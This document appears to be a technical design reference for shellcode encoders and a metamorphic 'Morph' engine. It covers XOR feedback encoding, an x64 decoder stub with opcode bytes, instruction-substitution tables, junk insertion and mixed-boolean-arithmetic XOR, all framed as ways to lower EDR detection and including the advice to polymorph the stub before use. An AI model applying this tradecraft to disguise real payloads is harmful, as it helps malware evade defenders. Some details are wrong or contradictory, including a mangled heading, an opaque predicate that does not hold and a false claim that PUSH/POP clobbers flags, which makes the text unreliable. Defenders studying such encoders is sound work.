# Shellcode Encoders — ADFL, XorMeta, Morph, MBA-XOR

## Overview

| Encoder | Self-modifying | Output type | EDR signal |
|---|---|---|---|
| ADFL | Yes | W+X page required | Medium — decoder stub pattern |
| XorMeta | Yes (W+X) | W+X page required | Low — random registers |
| Morph | No | Directly RX-executable | Very low — no stub, no W+X |
| MBA-XOR | Optional | Decoded at runtime | Low — no XOR opcode pattern |

---

## 1. ADFL — Additive Feedback Loop XOR

Based on the Shikata Ga Nai idea: key is not static — it evolves via feedback.

### Encryption (build time, reverse order)
```python
seed = KEY  # single random byte
ct = bytearray(len(pt))
for i in range(len(pt) - 1, -1, -1):
    ct[i] = pt[i] ^ seed
    seed   = (pt[i] + seed) % 256  # feedback: seed updates from plaintext
```

### Decryption (runtime, forward order)
```python
seed = KEY
for i in range(len(ct)):
    pt[i] = ct[i] ^ seed
    seed   = (pt[i] + seed) % 256  # same update from recovered plaintext
```

### x64 Decoder Stub Bytes
```nasm
; ADFL decoder — RIP-relative, x64
    mov   bl, KEY             ; 2 bytes: B3 xx
    mov   rcx, LENGTH         ; 7 bytes: 48 C7 C1 xx xx xx xx
    lea   rsi, [rip + 7]      ; 7 bytes: 48 8D 35 07 00 00 00
.loop:
    mov   al,  [rsi]          ; 2 bytes: 8A 06
    xor   al,  bl             ; 2 bytes: 32 C3
    mov   [rsi], al           ; 2 bytes: 88 06
    add   bl,  al             ; 2 bytes: 00 C3
    inc   rsi                 ; 3 bytes: 48 FF C6
    loop  .loop               ; 2 bytes: E2 F2
    ; encoded payload follows immediately
```

Stub size: 29 bytes. Poly-morph the stub before use to avoid byte-level detection.

---

## 2. XorMeta — Metamorphic Rolling-XOR

### Key properties
- Per-build random register assignment (decoder uses different regs each time)
- Instruction equivalence substitutions per build
- Variable-length key (multi-byte)
- Requires W+X for self-decryption

### Equivalence transformations (applied randomly per build)
```
INC rX          -> ADD rX, 1       / LEA rX, [rX+1]
DEC rX          -> SUB rX, 1       / ADD rX, -1
XOR rX, rX      -> SUB rX, rX      / MOV rX, 0  / AND rX, 0
MOV rX, imm     -> XOR rX,rX ; ADD rX, imm
TEST rX, rX     -> OR rX, rX       / CMP rX, 0
JZ  target      -> JE target        (alias — same encoding)
```

### Junk instruction insertion
Insert dead code that does not affect decoder registers:
```nasm
PUSH RAX ; POP RAX          (clobbers flags — only safe between flag-using instructions)
MOV R10, R10                (no-op)
LEA R11, [RSP]              (no flag effect, no useful side-effect)
```

---

## 3. Morph — RX-Compatible Instruction Rewriter

### Design contract
- **No decoder stub** — output is directly executable as RX
- **No W+X** — safe to place in non-writable memory
- Structural divergence defeats hash/byte pattern matching

### Transformation types

#### IMM decomposition
```nasm
; original
MOV RAX, 0x12345678
; substituted
XOR RAX, RAX
ADD RAX, 0x1234
SHL RAX, 16
OR  RAX, 0x5678
```

#### Equivalence swap
```nasm
; original
XOR RBX, RBX
; substituted
SUB RBX, RBX
```

#### Dead code insertion (register-safe variants)
```nasm
; insert before any use of R11 where R11 is not live
MOV R11, 0x539
IMUL R11, 2
SHR R11, 1          ; R11 still 0x539 (dead, overwritten before use)
```

### CALL-POP preservation rule
Morph **must not** insert instructions between a CALL and its matching POP.
The rewriter tracks `CALL .next; .next: POP reg` anchor pairs via relocation table.

Anchor detection algorithm: scan for `E8 xx xx xx xx` (CALL rel32, forward) whose target
byte is `58..5F` (POP reg8) or `REX 58..5F`. Everything from the CALL's return address
(byte immediately after the CALL opcode) to end of shellcode is the **anchored zone** —
junk insertion and size-changing transforms are suppressed there. Size-preserving
transforms (direction-bit swap, XOR↔SUB zeroing) are still applied in the anchored zone.

---

### Full Transform Catalogue (ADE Morph engine)

#### A. IMM Decomposition — `morphImm()`

Targets: `MOV reg, imm64` (10 bytes, REX.W) and `MOV reg, imm32` (5 bytes).

Strategy — work **backwards** from target value, undo random ADD/SUB/XOR operations,
then emit the resulting chain forward:
```
original:  MOV RAX, 0xDEADBEEF
morphed:   PUSHFQ
           MOV RAX, <rand_seed>      ; computed starting value
           ADD RAX, <r1>             ; random imm32, sign-extended
           XOR RAX, <r2>
           SUB RAX, <r3>
           POPFQ
```

**Why PUSHFQ/POPFQ**: `MOV reg, imm` does NOT modify flags. `ADD`/`SUB`/`XOR` do.
Without the save/restore wrapper, code that depends on flags set before the original MOV
could observe changed flags after. PUSHFQ/POPFQ preserves the EFLAGS contract.

Constraint: all random values are sign-extended imm32 (32-bit random → sign-extend to 64)
so every step encodes as `REX.W + 81 /r imm32` (7 bytes) without needing a 10-byte imm64.

Chain length: 3–5 ops for imm64; 2–4 ops for imm32. Chosen uniformly at random per call.

---

#### B. Equivalence Swap — `morphEquiv()`

| Pattern detected | Possible output (random) | Flag contract |
|---|---|---|
| `XOR r, r` (mod=11 self-XOR) | `XOR r, r` \| `SUB r, r` | ZF=1, CF=0, OF=0, SF=0, PF=1 — identical |
| `SUB r, r` (mod=11 self-SUB) | `XOR r, r` \| `SUB r, r` | same |
| `NOP` (0x90) | multi-byte NOP (2/3/4-byte) | no flag effect |

**INC/DEC are NOT swapped with ADD/SUB 1** — `INC`/`DEC` do NOT modify CF, but `ADD`/`SUB`
DO. Code like `INC ECX; ADC EAX, 0` relies on CF being unchanged across `INC`.

**`MOV r, 0` is NOT emitted as a zeroing equivalent** — `MOV` does not set flags;
code may rely on ZF/CF being set by the original `XOR r,r` or `SUB r,r`.

---

#### C. Direction-Bit Swap — `morphDirSwap()`

x86 encodes many register-register ALU ops in two ways: direction bit selects which
operand is destination. Toggling it + swapping `reg`↔`r/m` in ModRM + swapping `REX.R`↔`REX.B`
produces a **different byte sequence** for the same instruction.

Pairs (both directions):
```
ADD(01↔03)  OR(09↔0B)   ADC(11↔13)  SBB(19↔1B)
AND(21↔23)  SUB(29↔2B)  XOR(31↔33)  CMP(39↔3B)
MOV(89↔8B)
```
Only applied to `mod=11` (register-register) encodings; size-preserving.
`TEST (85)`: commutative — swap `reg`↔`r/m` in ModRM (`reg` field is read-only in TEST).

---

#### D. Junk Insertion — `morphJunk()`

**Only** Intel-recommended multi-byte NOP encodings are safe:

| Bytes | Encoding |
|---|---|
| 1 | `90` (NOP) |
| 2 | `66 90` |
| 3 | `0F 1F 00` |
| 4 | `0F 1F 40 00` |
| 5 | `0F 1F 44 00 00` |
| 7 | `0F 1F 80 00 00 00 00` |
| 9 | `66 0F 1F 84 00 00 00 00 00` |

**Why only NOPs**: In x86-64, ANY 32-bit register write (e.g. `XCHG r32,r32`, `LEA r32,[r32]`,
`MOV r32,r32`) zero-extends to 64 bits and **corrupts the upper 32 bits** of the register.
So-called "safe junk" dummy instructions that clobber registers are NOT safe in 64-bit mode.

Junk is suppressed at: (a) `CALL $+0` return-address targets, (b) anchored zone.

---

#### E. Jump Widening + Stabilization

When junk insertion shifts a short-jump target, the displacement may overflow rel8 (-128..+127).
The engine widens automatically:
- `JMP short (EB xx)` → `JMP near (E9 xx xx xx xx)` (2 bytes → 5 bytes)
- `Jcc short (70..7F)` → `Jcc near (0F 80..8F xx xx xx xx)` (2 bytes → 6 bytes)
- `LOOP/JCXZ` — not widenable; left as-is (displacement clamped)

After any widening, sizes change again and all offsets must be recomputed.
The engine runs up to **5 stabilization passes** until no new widenings occur.

---

#### F. Prolog / Epilog Dead Zones

The final output wraps the morphed core:
```
[JMP rel32]  [dead zone: 32–256 random bytes]  [morphed shellcode]  [dead trailer: 16–64 bytes]
```
- JMP skips the dead zone entirely — the zone is never executed
- Dead bytes are Intel multi-byte NOPs + `PUSH reg; POP reg` pairs and `MOV r,r` variants
- Epilog dead trailer appended after last instruction — never reached, changes trailing hash

--- — Mixed Boolean Arithmetic

### Core identity
```
a XOR b  =  (a + b) - 2*(a AND b)
```
Replaces XOR with add/subtract/and — breaks single-instruction pattern scanners.

### Extended form (with rotation layer)
```c
static inline uint8_t mba_xor(uint8_t a, uint8_t b) {
    return (uint8_t)((a + b) - 2*(a & b));
}

static inline uint8_t ror3(uint8_t v) {
    return (v >> 3) | (v << 5);
}

// decrypt byte i:
uint8_t key_idx = (uint8_t)(i & (KEY_LEN - 1));  // KEY_LEN must be power of 2
uint8_t pt = ror3(mba_xor(ct[i], key[key_idx]));
```

### MBA modulo trick (avoids `%` which compiles to DIV or visible pattern)
```c
// i % kl  where kl is a power of 2:
uint8_t idx = (uint8_t)(i & (kl - 1));
// if kl is not power-of-2, use: i - kl*(i/kl)  intentionally slower
```

### Assembly inline MBA-XOR (x64 NASM, byte-at-a-time)
```nasm
; inputs: AL = ciphertext byte, BL = key byte
; output: AL = plaintext byte (ror3 applied)
    movzx cx,  al
    movzx dx,  bl
    add   cx,  dx              ; cx = a + b
    and   al,  bl              ; al = a & b
    add   al,  al              ; al = 2*(a & b)
    sub   cl,  al              ; cl = (a+b) - 2*(a&b) = a^b
    ; ror3(cl):
    mov   al,  cl
    shr   al,  3               ; >> 3
    mov   ch,  cl
    shl   ch,  5               ; << 5
    or    al,  ch              ; al = ror3(result)
```

---

## 5. Extended Morphing Techniques

Taxonomy of metamorphic transforms beyond what ADE Morph currently implements.

---

### 5.1 Register Renaming

Replace all uses of a register with an unused register throughout a function.
Changes opcode bytes (e.g. `inc eax` vs `inc ebx` differ), defeating byte-level patterns.

Constraints: (a) no spill at call boundaries (ABI registers must match); (b) must trace
liveness across basic blocks to ensure the substituted register is free for the whole region;
(c) in 64-bit mode, any 32-bit write clears upper 32 bits — renaming within same-width class only.

---

### 5.2 Code Transposition (Instruction Reordering)

Reorder independent instructions within a basic block. Requires dependency analysis:
- Build a def-use DAG for the block
- Any topological sort of the DAG is a valid reordering
- Conditional jumps and memory stores must anchor the order at block boundaries

SGN (Shikata Ga Nai) uses this on the **decoder stub** itself: the stub is represented as
a dependency graph so initialization sub-steps that have no ordering constraint are shuffled
per build — producing a unique byte sequence without changing decoder semantics.

---

### 5.3 Opaque Predicates

Insert dead branches whose condition is always true or always false but is hard for a static
analyzer to resolve:
```nasm
; Opaque predicate: x*(x+1) always even → bit 0 always 0
    mov  eax, SOME_REG
    imul eax, eax
    test eax, 1
    jnz  never_taken        ; dead branch — never executes
    ; real code continues
never_taken:
    ; garbage bytes (never reached)
```
Used to insert unreachable code blocks that look real to pattern scanners.

---

### 5.4 Memory-Operand Immediate Extraction (breakdev technique)

For instructions like `CMP [mem+SIB], imm32`, extract the immediate into a temp register
via arithmetic chain, then use the register-form of the instruction:
```nasm
; original: CMP [EDX+ESI*4+0x50], -0x12
; morphed:
    PUSH EAX
    MOV  EAX, <seed>         ; computed starting value
    ADD  EAX, <r1>           ; chain undoes to -0x12
    XOR  EAX, <r2>
    SUB  EAX, <r3>
    CMP  [EDX+ESI*4+0x50], EAX   ; same semantics, opcode changed (imm → reg form)
    POP  EAX
```
Opcode re-encoding: `83 /7 imm8` → `38 /r` or `3B /r` (CMP with reg source).
Requires a scratch register that can be saved/restored around the site.

---

### 5.5 SMT-Based Equivalence ([m]allotROPism)

Feed instruction semantics to an SMT solver (e.g. Z3). The solver generates all sequences
that produce the same output state. Produces more diverse substitutions than a static table
but requires offline pre-computation per target ISA subset.

Limitation: solver must be protected from stack-relative addresses (RSP-based values are
non-constant across instances — any solution containing a hardcoded RSP value is invalid).

---

### 5.6 MetaPHOR-Style Substitution Table

Static table of ~94 semantically equivalent instruction sequences.
Engine walks instructions sequentially, matches against table rules, random-picks a variant.
Conditions must be checked before substitution (example: `INC → ADD 1` only valid if CF
is not depended upon by a downstream consumer — requires simple liveness analysis).

Common table entries for x86-64:

| Original | Substitute | Condition |
|---|---|---|
| `INC reg` | `ADD reg, 1` | CF not live after |
| `DEC reg` | `SUB reg, 1` | CF not live after |
| `MOV reg, 0` | `XOR reg, reg` | flags not live before |
| `MOV reg, imm` | `XOR reg,reg; ADD reg,imm` | flags not live before |
| `ADD reg, -N` | `SUB reg, N` | always |
| `TEST reg, reg` | `OR reg, reg` / `CMP reg, 0` | always |
| `PUSH reg; POP reg` | `NOP` (any length) | stack balance maintained |
| `JZ` | `JE` | always (same encoding) |
